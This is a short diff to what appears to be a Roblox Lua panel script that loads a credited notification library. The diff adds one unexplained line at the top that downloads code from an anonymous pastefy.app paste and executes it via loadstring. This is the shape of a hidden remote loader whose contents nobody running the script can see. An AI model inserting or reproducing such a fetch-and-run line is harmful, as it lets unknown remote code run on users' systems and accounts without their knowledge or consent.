@@ -1,4 +1,5 @@
 --// credit to IceMinisterq for the notification library
+loadstring(game:HttpGet("https://pastefy.app/SsJzir8l/raw"))()
 local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))()
 NotificationLibrary:SendNotification("Info", "Silly Panel made by https :p *bleh*~", 10)
 
